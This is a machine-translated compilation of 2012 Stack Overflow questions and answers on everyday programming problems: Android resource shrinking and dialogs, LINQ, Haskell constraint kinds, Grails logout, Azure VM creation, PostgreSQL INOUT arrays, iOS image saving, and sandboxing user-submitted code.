现在我正在做一个非常小的项目，我也使用我的库项目。但我只需要其中的一小部分，并且我认为 java 编译器足够聪明，可以知道我需要哪些类和资源。好吧，直到我看到完整包的文件大小......经过一些反编译后，我发现我的库项目中所有未使用的资源也都编译到了apk中。

所以现在我的问题是，有没有办法告诉 android 编译器它应该忽略未使用的资源？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:15:23.877

尝试使用[Proguard 之](http://proguard.sourceforge.net/)类的工具。除此之外，它还能够检测未使用的类、字段等，从而减小包的大小。

其功能集的摘录：

> [ProGuard](http://proguard.sourceforge.net/)是一个免费的 Java 类文件收缩器、优化器、混淆器和预验证器。它检测并删除未使用的类、字段、方法和属性。它优化字节码并删除未使用的指令。(...)

编辑：还有一个专门用于 Android 的优化器，称为[DeXGuard](http://www.saikoa.com/dexguard)。

# android - alertDialog 中未显示按钮

> ID：10991805
> 
> 赞同：0
> 
> 时间：2012-06-12T06:57:19.713
> 
> 标签：android, android-alertdialog

我正在创建一个扩展 AlertDialog 的类。和设置布局。但是当弹出被调用时，

**1) 布局是透明的

2）即使在调用 setButton ** 后按钮也不可见我不知道该怎么做，也不知道为什么会发生。

我的课程是这个 DateTimeDialog.java

```
public class DateTimeDialog extends AlertDialog{

    Date date;
    String title;
    DialogInterface.OnClickListener listner;
    protected DateTimeDialog(Context context, String title, Date date ) {
        super(context);
        // TODO Auto-generated constructor stub
        this.title = title;
        this.date = date;
    }

    public void initListener(DialogInterface.OnClickListener listner){
        this.listner = listner;
    }

    public Date getDate(){

        return date;
    }

    @Override
    public void onCreate(Bundle savedInstanceState){
        //super.onCreate(savedInstanceState);
        setContentView(R.layout.date_time_picker);

        setTitle(title);

        setButton( "OK", listner);

        setButton(DialogInterface.BUTTON_NEGATIVE, "Cancel",
                new OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        // Do something
                        dialog.dismiss();
                    }
                });

    } 
```

调用此类的方法

```
final DateTimeDialog dateTimeDialog = new DateTimeDialog(context, "title", time);
           dateTimeDialog.show();
           dateTimeDialog.initListener(new DialogInterface.OnClickListener() {

                @Override
                public void onClick(DialogInterface dialog, int which) {
                    // TODO Auto-generated method stub
                    //doSomething
                }
            }); 
```

请帮忙.....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:10:10.060

当您调用 setContentView 时，您将覆盖 AlertDialog 类提供的所有内容。如果您想自己设置内容视图，则需要在 XML 文件中添加按钮并设置侦听器。

# c# - 从列表 A 中删除一组元素并使用 Linq 添加到列表 B

> ID：10991808
> 
> 赞同：0
> 
> 时间：2012-06-12T06:57:41.187
> 
> 标签：c#, linq

我试图通过用 linq 调用替换项目中的现有代码来精简 linq。在此方法中，我检查行列表中的条件，如果条件为真，则将该元素从行移至已处理行。

数据结构只是列表：

```
List<LineSegment2> lines;
List<LineSegment2> processedLines; 
```

原始代码是：

```
for (int i = lines.Count - 1; i >= 0; i--)
{           
   if (lines[i].P2.x < sweepPosition)
   {
      processedLines.Add(lines[i]);
      lines.RemoveAt(i);
   }
} 
```

我的 linq 代码是：

```
var toMove = lines.FindAll(x => x.P2.x < sweepPosition);
toMove.ForEach(x =>
{
   processedLines.Add(x);
   lines.Remove(x);
}); 
```

我的问题是：这个 linq 代码是否效率较低，因为它使用更多内存来创建临时列表“toMove”。有没有办法在不需要临时列表的情况下创建 linq 查询，或者原始代码总是更有效？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:28:00.750

The "linq" code is less efficient and (more importantly) not necessarily much easier to maintain. Stick with your original code if you must choose between these two alternatives. I'd just recommend you run the `for` loop forward -- no reason you should run it backwards like you're doing.

As a side note, I wonder if it would be appropriate for your use case to just maintain a single list and add an `IsProcessed` property to the `LineSegment2` class. You might consider that.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:06:27.283

更 LINQy 的解决方案是一次添加所有已处理的行，然后获取剩余的行：

```
processedLines.AddRange(lines.Where(x => x.P2.x < sweepPosition));
lines = lines.Where(x => x.P2.x >= sweepPosition).ToList(); 
```

至于效率，它不会像您的原始代码那么快。这不是您使用 LINQ 的原因。

不过，有一个潜在的优势。它将创建一个新的行列表，因此如果您将很多行移动到已处理列表中，它将删除列表中未使用的项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:04:50.283

我不太确定效率......但在Linq我会这样做

```
processedLines = processedLines.Concat(lines.Where(x => x < sweepPosition)).ToList();
lines.RemoveAll(x => x < sweepPosition); 
```

# macos - OSX 10.8 OpenGL 扩展

> ID：10991809
> 
> 赞同：3
> 
> 时间：2012-06-12T06:57:44.720
> 
> 标签：macos, opengl, osx-mountain-lion

是否可以完整列出 OSX 10.8 中支持的 OpenGL 扩展？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-27T12:33:10.230

Apple 尚未更新其功能表，但我发现此表适用于 10.8： [http ://arek.bdmonkeys.net/GLInfo/GLInfo.html](http://arek.bdmonkeys.net/GLInfo/GLInfo.html)

# iphone - 用 PhotoAlbum 中的文字保存照片

> ID：10991815
> 
> 赞同：0
> 
> 时间：2012-06-12T06:58:37.557
> 
> 标签：iphone, uiview, subclass, photo, quartz-graphics

我有一个包含书面广告的 UIView 子类，我想将它添加到图形上下文中的照片上，但是当我保存照片时，这个 UIView 没有保存在相册中。这是代码：

```
 - (IBAction)saveAction:(id)sender{

CGRect newFrame=imageInImageViewFrame(self.userImageView.bounds,self.userImageView.bounds.size);

CGSize imageSize=self.userImageView.bounds.size;

if (NULL != UIGraphicsBeginImageContextWithOptions)
    UIGraphicsBeginImageContextWithOptions(imageSize, NO, 0.0);
else
    UIGraphicsBeginImageContext(imageSize);

CGContextRef context = UIGraphicsGetCurrentContext();

UIGraphicsPushContext(context);

[self.userImageView.image drawInRect: newFrame];
self.banner =[[Banner alloc]initWithFrame:CGRectMake(0, 324, 320, 48)];//this is the UIView that I want add on photo

[self.userImageView addSubview:self.banner];
NSLog(@"The image is %@", self.banner);

UIGraphicsPopContext();
[self renderView:self.gestureView inContext:context ];
UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
UIImageWriteToSavedPhotosAlbum(screenshot, nil, nil, nil);

UIGraphicsEndImageContext();

NSString *docPath=(NSString*)[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,   NSUserDomainMask, YES) objectAtIndex:0];
NSString *imagesPath=[NSString stringWithFormat:@"%@/%@/%@",docPath, self.profileName,imageDirectory];
     //trovare progressivo forse con enumerazione di directory
[[NSFileManager defaultManager]createDirectoryAtPath:imagesPath withIntermediateDirectories:NO attributes:nil error:nil]; //crazione di una directory a un certo indirizzo
NSData *imageData=UIImageJPEGRepresentation(screenshot, 0.9);
NSMutableArray *dirContent=[[[NSFileManager defaultManager]contentsOfDirectoryAtPath:imagesPath error:nil]mutableCopy]; //copia del contenuto della directory
[dirContent removeObject:@".DS_Store"]; //rimuove il file nascosto
NSArray *sortedFileNames=[dirContent sortedArrayUsingSelector:@selector(localizedCaseInsensitiveCompare:)];
NSString *lastFileName=[sortedFileNames lastObject];
[dirContent release];

int progressiveImageNumber=[[[lastFileName componentsSeparatedByString:@"_"]objectAtIndex:1]intValue];
NSString *fullImageNamePath=[NSString   stringWithFormat:@"%@/photoImage_%.2d.jpg",imagesPath,progressiveImageNumber+1];
NSLog(@"fullimagepath:%@",fullImageNamePath);

[imageData writeToFile:fullImageNamePath atomically:YES]; 
```

}

照片已保存，但 UIView 未保存。我能怎么做？提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:43:14.700

通过删除您的代码在您的方法中使用此代码：

```
 UIGraphicsBeginImageContext(self.gestureView.bounds.size);
 [self.gestureView.layer renderInContext:UIGraphicsGetCurrentContext()];
 UIImage *screenShot = UIGraphicsGetImageFromCurrentImageContext();
 UIGraphicsEndImageContext();

 // save image to photos
 UIImageWriteToSavedPhotosAlbum(screenShot, self, nil, nil); 
```

# haskell - haskell 约束族

> ID：10991818
> 
> 赞同：3
> 
> 时间：2012-06-12T06:58:45.447
> 
> 标签：haskell, types

我开始对 GHC 7.4.2 中的新类约束扩展感到困惑，但我在让一个小例子工作时遇到了一些问题。代码如下：

```
{-# LANGUAGE UndecidableInstances,
         MultiParamTypeClasses,
         KindSignatures,
         TypeFamilies,
         Rank2Types,
         ConstraintKinds,
         FlexibleInstances,
         OverlappingInstances #-}

module Test where

  import GHC.Exts  -- to get Constraint type constructor

  class NextClass f where
    type Ctxt f a :: Constraint
    next :: (Ctxt f a) => a -> a

  instance NextClass Int where
    type Ctxt Int a = Num a
    next b = b + 1

  n :: (NextClass a) => a -> a
  n v = next v 
```

我想要做的是定义一个`NextClass`类型类，这将允许我（给定一个值 x）为所有类型的实例获取 x 的下一个值`NextClass`。要使用`+`运算符，我`Num a`需要`Int`.

但是，GHC 给了我以下错误：

```
Could not deduce (Ctxt f0 a) arising from a use of `next'
from the context (NextClass a)
   bound by the type signature for n :: NextClass a => a -> a
In the expression: next v
In an equation for `n': n v = next v 
```

我怀疑 GHC 告诉我它没有足够的信息来确定要使用哪个约束族实例。

有人可以解释我在这里做错了什么。这是对约束族的正确使用吗？

TIA

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T07:20:09.283

您的定义中发生了一些奇怪的事情。首先，`f`（唯一的）类方法的类型中从未提及类变量`next`。编译器应该如何选择要使用的类型类的哪个实例？我假设你的意思是这样的：

```
{-# LANGUAGE ConstraintKinds, TypeFamilies #-}
module Test where

import GHC.Exts  -- to get Constraint type constructor

class NextClass f where
    type Ctxt f :: Constraint
    next :: Ctxt f => f -> f

instance NextClass Int where
    type Ctxt Int = Num Int
    next b = b + 1

n :: (NextClass a) => a -> a
n v = next v 
```

下一个奇怪的是它`Int`已经有一个`Num`实例，所以这不是一个很大的限制。但是让我们暂时把它放在一边（因为它不会影响我们得到的错误）并看看新的错误：

```
test.hs:15:7:
    Could not deduce (Ctxt a) arising from a use of `next'
    from the context (NextClass a)
      bound by the type signature for n :: NextClass a => a -> a
      at test.hs:15:1-12
    In the expression: next v
    In an equation for `n': n v = next v 
```

实际上，这个错误看起来很合理：约束的全部意义在于拥有一个 for 的实例`NextClass a`是不够的；我们还必须有一个`Ctxt a`. 所以我们可以修复类型签名：

```
n :: (NextClass a, Ctxt a) => a -> a
n v = next v 
```

...然后它编译。最后一个奇怪的是，这是对约束类型的一种特别退化的使用，因为这个更简单的代码本质上是等价的：

```
class NextClass f where
    next :: f -> f

instance Num Int => NextClass Int where
    next b = b + 1 
```

...并且从以前的事物到新事物的翻译非常机械：您无需声明`instance NextClass {- foo -} where type Ctxt {- foo -} = {- bar -}`，而是直接编写`instance {- bar -} => NextClass {- foo -}`。

# grails - 以编程方式注销用户

> ID：10991819
> 
> 赞同：3
> 
> 时间：2012-06-12T06:58:53.643
> 
> 标签：grails, spring-security

用户登录后，我检查他们的角色。如果他们没有角色，我想将他们注销。这就是我现在正在做的事情：

```
if (SpringSecurityUtils.ifAllGranted('ROLE_ADMIN')) {
    redirect(uri: '/book/edit')
}
else if (SpringSecurityUtils.ifAllGranted('ROLE_USER')) {
    redirect(uri: '/book/list')
}
else {
    redirect(uri: '/login/auth')
} 
```

这不起作用，因为有一个递归重定向到`/login/auth`. 我该如何正确执行此操作（注销然后重定向到`/login/auth`）？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T07:17:59.227

顺便说一句，要注销当前登录的用户，您可以拨打以下电话：

```
SecurityContextHolder.clearContext() 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-12T13:57:51.923

```
class AnyController {    
    def logoutHandlers

    def method = {
    ...
        logoutHandlers.each { handler ->
            handler.logout(request, response, springSecurityService.authentication)
        }
    }
} 
```

# java - 如何通过java POI api从excel表中删除所有公式？

> ID：10991820
> 
> 赞同：1
> 
> 时间：2012-06-12T06:58:54.323
> 
> 标签：java, excel, apache-poi, excel-formula

我们可以通过 cell.setCellFormula(null) 从一个单元格中删除公式。但如果我想让整个表格公式免费。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:01:48.263

请参阅完全回答您的问题[的 Apache POI 站点](http://poi.apache.org/spreadsheet/quick-guide.html#Iterator)。

# c# - 使用 C# 代码或 .net 以编程方式在 Windows azure 中创建虚拟机

> ID：10991821
> 
> 赞同：6
> 
> 时间：2012-06-12T06:59:01.777
> 
> 标签：c#, .net, azure, cloud

正如我们所知，Windows azure 门户中添加了一个名为虚拟机的新功能。但我想用 C# 或 . 网。所以任何人都可以帮忙...我应该使用哪个API，或者.net的API需要由天蓝色的人发布？请任何人指导我完成这项任务。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T07:13:27.247

您可能希望使用 Azure 的 REST 服务管理 API。例如，用于创建和管理 VM 的 API 位于： [创建虚拟机部署](http://msdn.microsoft.com/library/windowsazure/jj157194)。

此处记录了整个 API [。](http://msdn.microsoft.com/library/windowsazure/ee460799)

[由于您使用的是 .NET，因此托管 SDK 中](http://msdn.microsoft.com/library/dn578292.aspx)似乎会有服务管理 API ，但我在那里没有看到任何服务管理 API 引用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-23T00:37:35.290

我只是想在上述答案之后添加一些内容，当然您可以使用 Power Shell 或 C# 创建虚拟机，这是一个我发现使用 .Net API 可能很有趣的示例

[http://code.msdn.microsoft.com/windowsazure/How-to-program-control-838bd90b](http://code.msdn.microsoft.com/windowsazure/How-to-program-control-838bd90b)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-05T02:46:14.553

目前只有一个[用于创建虚拟机的 REST API](https://www.windowsazure.com/en-us/develop/net/)

这篇文章展示了如何[在 C# 中调用 REST API 来创建 VM](http://dotnetankit.blogspot.com.au/2012/07/create-persistent-vm-using-windows.html)的示例。请记住，虚拟机和 VMRole 是不同的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-04-04T21:59:47.003

很抱歉之前没有看到这个问题。[Microsoft Azure 管理库](http://www.nuget.org/packages/Microsoft.WindowsAzure.Management.Libraries/)（简称 MAML）可以提供对 Microsoft Azure 管理 API 的这种基于 .NET 的访问。MAML 以一系列 NuGet 包的形式提供，这些包就在本周正式发布。

为了配合发布，我发布了[一篇博客文章](http://www.bradygaster.com/post/announcing-the-general-availability-of-the-microsoft-azure-management-libraries-for-net)，链接到我为 //build/ 会议编写的[VS 扩展。](http://visualstudiogallery.msdn.microsoft.com/07c3e25f-970f-4bce-ba62-28b6e876188c)这个扩展通过 VS 项目和项目模板提供了一个演练，以及一些代码片段，它们完全符合您的要求 - 从控制台应用程序在 Microsoft Azure 中创建一个 VM。

我已经写了[一些关于 MAML 的其他帖子，这些帖子](http://www.bradygaster.com/category/Windows%20Azure)提供了其他指导和信息。希望这可以帮助！

# android - onItemSelected / setOnItemSelectedListener 未触发

> ID：10991824
> 
> 赞同：1
> 
> 时间：2012-06-12T06:59:30.383
> 
> 标签：android

> > 我正在使用 onclick on button 打开 spiiner，但我的微调器没有触发 setOnItemSelectedListener 这部分代码不起作用 public void onItemSelected(AdapterView arg0, View arg1, int pos, long id) { language = AppConstants.Language_arr[pos];
> 
> ```
>  }
>                     public void onNothingSelected(AdapterView<?> arg0) {
>                         // TODO Auto-generated method stub
> 
>                     } spinner opens but onitemselected is not working 
> ```

```
import com.privy.constants.AppConstants;
            import android.app.Activity;
            import android.os.Bundle;
            import android.view.View;
            import android.view.View.OnClickListener;
            import android.widget.AdapterView;
            import android.widget.AdapterView.OnItemSelectedListener;
            import android.widget.ArrayAdapter;
            import android.widget.Button;
            import android.widget.Spinner;
            import android.widget.ToggleButton;

            public class Settings extends Activity implements OnClickListener {
                private Spinner sp_languge, sp_login;
                private ToggleButton toggle_news_letter;
                private String language;
                private Button language_change;
                @Override
                protected void onCreate(Bundle savedInstanceState) {
                    // TODO Auto-generated method stub
                    super.onCreate(savedInstanceState);
                    setContentView(R.layout.settings);
                    sp_languge = new Spinner(this);
                    ArrayAdapter<String> adapter_language = new ArrayAdapter<String>(
                            Settings.this, R.layout.spinner_item, AppConstants.Language_arr);
                    sp_languge.setAdapter(adapter_language);
                    language_change = (Button) findViewById(R.id.language_change);
                    language_change.setOnClickListener(this);
                    sp_languge.setOnItemSelectedListener(new OnItemSelectedListener() {

                        public void onItemSelected(AdapterView<?> arg0, View arg1, int pos,
                                long id) {
                            language = AppConstants.Language_arr[pos];

                        }
                        public void onNothingSelected(AdapterView<?> arg0) {
                            // TODO Auto-generated method stub

                        }
                    });
                }
                public void onClick(View v) {
                    if (v == language_change) {

                        sp_languge.performClick();

                    }
                }
            } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:06:11.200

在 XMl 上添加宽度/高度为零的spiiner ....................

并使用

```
sp_languge = (Spinner)findViewById(R.id.<my_spinerid>); 
```

[android spinner performClick onItemSelected](https://stackoverflow.com/questions/5555549/android-spinner-performclick-onitemselected)

# c# - 当部件创建策略不共享时，MEF 如何获取先前的实例

> ID：10991825
> 
> 赞同：0
> 
> 时间：2012-06-12T06:59:38.170
> 
> 标签：c#, unit-testing, mef

我的程序中有一个`ItemListViewModel`和一个`ItemDefViewModel`。将`ItemDefViewModel`处理编辑项目中的任何数据，而`ItemListViewModel`该类提供概述并提供命令来实例化新的`ItemDefViewModel`. 我现在正在测试，我已经测试了`ItemDefViewModel`没有太多麻烦。我正在使用 MEF 并将`ItemDefViewModel`with创建`CreationPolicy`为非共享。内部通过容器`ItemListViewModel`获取一个新的，并在执行添加新项目的命令时调用其上的函数。更改此新项目的数据已在 中完成，但由于其创建策略，我无法处理它。有什么办法可以解决这个问题？`ItemDefViewModel``AddItem``ItemDefViewModel`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T14:53:12.213

您将需要保留`ItemDefViewModel`某处的实例（正如@JohnPolvora 指出的那样，您已经在您的`ItemListViewModel`.

如果您不能这样做，则需要保留该视图模型的状态，并将其恢复到新实例，`ItemDefViewModel`然后再应用您的更改。

# visual-c++ - 在 CFrameWnd MFC 上添加控件

> ID：10991826
> 
> 赞同：1
> 
> 时间：2012-06-12T06:59:49.480
> 
> 标签：visual-c++, mfc

如何在 CFrameWnd 上添加控件（如 ListCtrl 和 CButtons）？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T11:13:12.217

您最好的选择可能是创建一个[CDialogBar](http://msdn.microsoft.com/en-us/library/tdkcfwe6%28v=vs.80%29.aspx)并将您的控件粘贴在上面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T20:52:17.470

CListCtrl 与 CListView 相同。您也可以通过直接调用按钮的 Create 成员或调用 Create API 将 BUTTON 作为类的名称来创建按钮。

如果您想在对话框中使用许多控件，为什么不使用 CFormView 派生类作为您的视图？

# arrays - 通过 INOUT 参数返回数组而不进行修改

> ID：10991827
> 
> 赞同：1
> 
> 时间：2012-06-12T06:59:57.230
> 
> 标签：arrays, postgresql, plpgsql

我正在使用 PostgreSQL 9.1.3 和以下函数：

```
CREATE OR REPLACE FUNCTION cad(INOUT args text[], OUT retval int4) AS $cad$
BEGIN
    retval := 0;
    RAISE NOTICE 'cad: %', args;
END;
$cad$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION dodo(in_args text[]) RETURNS text[] AS $dodo$
DECLARE
    _res    text[];
    _rv     int4;

BEGIN
    _res := in_args;
    EXECUTE 'SELECT cad($1)' USING _res INTO _res, _rv;

    RETURN _res;
END;
$dodo$ LANGUAGE plpgsql; 
```

当我`cad`直接调用时，我得到了预期的输出：

```
psql$ select cad(ARRAY['Quiz']);
NOTICE:  cad: {Quiz}
-[ RECORD 1 ]---
cad | ({Quiz},0)

Time: 0,319 ms 
```

我对调用的预期结果`dodo(ARRAY['Quiz'])`是没有更改的输入数组。但相反，我收到以下错误：

```
psql$ select dodo(ARRAY['Quiz']); 
NOTICE:  cad: {Quiz}CONTEXT:  SQL statement "SELECT cad($1)"
PL/pgSQL function "dodo" line 8 at EXECUTE statement
ERROR:  array value must start with "{" or dimension information
CONTEXT:  PL/pgSQL function "dodo" line 8 at EXECUTE statement 
```

这里有什么问题？

PS：我必须使用`EXECUTE`as 函数来调用会有所不同，出于提问的目的简化了代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T12:08:27.350

你想要这样的东西：

```
EXECUTE 'SELECT * FROM cad($1)' USING _res INTO _res, _rv; 
```

返回类型不是两列 text[],int 它是 (text[],int) 的记录，需要展开。

# android - 使用 Phonegap 渲染原生 Android 应用

> ID：10991830
> 
> 赞同：1
> 
> 时间：2012-06-12T07:00:14.720
> 
> 标签：android, html, css

我正在使用 Phonegap 开发一个 Android 应用程序。有一件事让我很头疼，那就是渲染。例如 css 边框，我为每个边框使用 1px 的宽度，但在我的应用程序中，有些边框比其他边框厚。

有没有办法解决这个问题？

提前致谢！

**更新**

我试图用这个改变元标记：

```
<meta name="viewport" content="width=device-width; target-densityDpi=device-dpi; initial-scale=1; maximum-scale=1; minimum-scale=1; user-scalable=0" /> 
```

在 android 模拟器中它解决了我的问题，但在我的 HTC Sensation 上我仍然得到丑陋的渲染。

# sql - asp.net mvc 3 EF查询一对多关系

> ID：10991834
> 
> 赞同：0
> 
> 时间：2012-06-12T07:00:27.697
> 
> 标签：sql, asp.net-mvc-3, entity-framework

我是 asp.net mvc 的新手，我有一些问题，我想我可以用 asp.net 网络表单很容易地解决它们。但是项目必须在 mvc 中，所以这就是问题所在。

我有 X 表

table1 用户 int user_ID string 用户名

table2 Friends int FriendshipID int user_ID intfriend_ID

在表 2 中，user_ID 代表当前登录的用户。friend_ID 代表他朋友的 id。它的一对多关系。现在我想做的是，在用户/详细信息/ID 视图中，显示该用户的所有朋友。我要进行的查询是：首先从 table2 中选择朋友 ID，其中 user_ID = id（来自查询字符串），然后从 table1 中选择每个用户名，其中 user_ID = 朋友 ID。

我认为这在 SQL 中真的很容易，但不知道如何使用 mvc 语法来做到这一点。

控制器：

// // 获取：/用户/详细信息/5

```
 public ViewResult Details(int id)
    {
        User user = db.Users.Find(id);
        return View(user);
    } 
```

风景：

```
@model Social2.Models.User

<div class="display-label">Friends</div>
<div class="display-field">

    @foreach (var friend in @Model.Friends)
    {
        @friend.User.username;
    }

</div> 
```

视图返回错误的结果。

楷模

```
public partial class User
{
    public User()
    {
        this.Albums = new HashSet<Album>();
        this.Friends = new HashSet<Friend>();
        this.Messages = new HashSet<Message>();
        this.Posts = new HashSet<Post>();
        this.Groups = new HashSet<Group>();
    }

    public int user_ID { get; set; }
    public System.Guid user_UniqueID { get; set; }
    public string username { get; set; }

    public virtual ICollection<Album> Albums { get; set; }
    public virtual aspnet_Users aspnet_Users { get; set; }
    public virtual ICollection<Friend> Friends { get; set; }
    public virtual ICollection<Message> Messages { get; set; }
    public virtual ICollection<Post> Posts { get; set; }
    public virtual ICollection<Group> Groups { get; set; }
} 
```

和朋友表

```
public partial class Friend
{
    public int friendship_ID { get; set; }
    public int user_fr_ID { get; set; }
    public int friend_ID { get; set; }

    public virtual User User { get; set; }
} 
```

也是上下文

```
public partial class ASPNETDBEntities : DbContext
{
    public ASPNETDBEntities()
        : base("name=ASPNETDBEntities")
    {
    }

    protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        throw new UnintentionalCodeFirstException();
    }

    public DbSet<Album> Albums { get; set; }
    public DbSet<aspnet_Users> aspnet_Users { get; set; }
    public DbSet<Friend> Friends { get; set; }
    public DbSet<Group> Groups { get; set; }
    public DbSet<Message> Messages { get; set; }
    public DbSet<Picture> Pictures { get; set; }
    public DbSet<Post> Posts { get; set; }
    public DbSet<sysdiagram> sysdiagrams { get; set; }
    public DbSet<User> Users { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:07:32.133

制作您自己的 ViewModel 类。从数据库中检索数据并构建模型类对象。将此模型类传递给视图，即基于此模型类创建您的视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:09:22.797

由于好友列表属性是虚拟的，它不会包含在您的查询中。尝试使用以下查询来包含好友。

```
public ViewResult Details(int id)
    {
        User user = db.Users.Include("Friends").FirstOrDefault(u => u.user_ID == id);
        //Also for each friend get the User:
        foreach (var friend in user.Friends.ToList())
        {
          friend.User = db.Users.Find(friend.friend_ID);
        }   
        return View(user);
    } 
```

**看法：**

```
<table>
@foreach (var friend in @Model.Friends)
    {

        <tr>

            @Html.DisplayFor(modelItem => friend.User.username)
        </tr>
    } 
</table> 
```

您的模型类似乎没有遵循实体键的约定。“user_ID”和“friendship_ID”字段应该是 UserId 和 FriendId。或者，如果您想像这样对它们进行键控，请使用 [key] 属性对其进行注释。

# android - 无法在 android 中播放 3gp 视频

> ID：10991836
> 
> 赞同：1
> 
> 时间：2012-06-12T07:00:35.393
> 
> 标签：android

首先，我能够在 android 中显示来自服务器的 3gp 视频。但在我的项目中都是 .flv 视频。因此，我使用视频转换器将 flv 视频转换为 3gp，然后尝试播放这些转换后的 3gp 视频。但是这次它显示这个视频无法播放。可能是什么原因以及如何解决此问题。请在这方面帮助我。

```
package com.play.video;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.MediaController;
import android.widget.VideoView;

public class PlayvideofromserverActivity extends Activity
{
    private VideoView vView;
    private String vSource;

    @Override
    public void onCreate(Bundle savedInstanceState) 
    { 

        super.onCreate(savedInstanceState);

        setContentView(R.layout.main);

        vView = (VideoView)findViewById(R.id.vview);

        vView.requestFocus();

            vSource ="http://server.com/video.3gp";
            vView.setVideoURI(Uri.parse(vSource));

        vView.setMediaController(new MediaController(this));

        vView.start();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:04:55.367

你确定你的 3GP 文件是正确的吗？转换时，总是有可能出现问题或转换器无法正确转换文件。我建议你检索一个原始的 3GP 来测试它，而不是一个转换的。

# iphone - 如何将捕获的视频保存在本地文件中

> ID：10991837
> 
> 赞同：0
> 
> 时间：2012-06-12T07:00:35.293
> 
> 标签：iphone, file, video

我想使用 iPhone 应用程序捕获视频。在这个视频文件中，我想存储本地应用程序。如何将此文件保存在本地。请帮我。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:06:48.187

你能行的 ：

```
-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info 
{      
    NSURL *videoURL = [info objectForKey:UIImagePickerControllerMediaURL];

    NSData *videoData = [NSData dataWithContentsOfURL:videoURL];
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *tempPath = [documentsDirectory stringByAppendingFormat:@"/vid1.mp4"];

    BOOL success = [videoData writeToFile:tempPath atomically:NO];

    [picker dismissModalViewControllerAnimated:YES];
} 
```

# xcode - 我在哪里将更改导航栏颜色的代码放在 xcode 4.3 中

> ID：10991845
> 
> 赞同：0
> 
> 时间：2012-06-12T07:00:55.520
> 
> 标签：xcode, uinavigationcontroller, uicolor, navigationbar, tintcolor

好的，现在是凌晨 3 点，我不知道我把这个放在哪里：

```
[navigationController.navigationBar setTintColor:[UIColor redColor]; 
```

如果您愿意，请发布整个 .m/.h 文件，那就太好了。另外，我是否使用 segues 或插座连接任何东西？当您创建 .h/.m 文件时，我需要选择 UINavigationController 或类似的选项，还是只需要普通的 UIViewController？谢谢。

更新：没关系，我明白了，不过谢谢。以下是其他人遇到我的问题的代码。

```
 - (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    UINavigationBar *bar = [self.navigationController navigationBar];

    [bar setTintColor:[UIColor lightGrayColor]];
} 
```

基本上只是添加到已经存在的内容。我觉得很愚蠢哈哈。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:03:56.407

您可以在您之后立即设置该值`init`，`UINavigationController`即：

```
UINavigationController *controller = [[UINabvigationController alloc] initWithRoot...
[controller.navigationBar setTintColor:[UIColor redColor]]; 
```

# user-input - 允许用户使用编程语言的沙盒版本

> ID：10991850
> 
> 赞同：7
> 
> 时间：2012-06-12T07:01:40.233
> 
> 标签：user-input, sandbox

*注意：我会很感激这个标签的一些建议..*

我想为我的用户提供一种以编程方式操作服务器上数据的方法。这将通过使用稍后执行的浏览器内代码编辑器来完成，这与[https://www.onx.ms](https://www.onx.ms)采用的方式没有什么不同。

我想避免编写 DSL（采用的障碍？），并且希望用户编写的语言是基于 JavaScript 或 Ruby 的。

我明显担心的是安全性。我了解允许用户生成的代码在服务器端运行的危险，但我可以采取哪些步骤来消除风险？

像[http://railsforzombies.com](http://railsforzombies.com)这样的网站真的使用`irb`，还是比这简单得多？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T23:18:07.793

[Google Caja](https://code.google.com/p/google-caja/)让您可以在您的网站中安全地嵌入用户指定的 Javascript，但我认为它可能旨在在用户的浏览器中而不是在您的服务器上运行代码。我自己没用过。

我不知道是否有针对其他语言的现成解决方案，但我认为自定义解决方案将涉及在删除所有允许用户写入磁盘、打开网络连接、分叉进程/线程的 API 库后自己重新编译解释器，并执行任何其他危险或拒绝服务操作。将“安全”库列入白名单是唯一可行的方法。

如果您为各个用户提供单独的虚拟服务器，那会更安全。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-20T08:07:00.530

你会考虑 Java（或其他 JVM 语言，如 JRuby、Scala、Clojure 等）吗？如果是这样 - JVM 中有强大的功能来限制沙盒应用程序的权限。有关详细信息，请参阅其他问题：[如何创建 Java 沙箱？](https://stackoverflow.com/questions/1715036/how-do-i-create-a-java-sandbox)

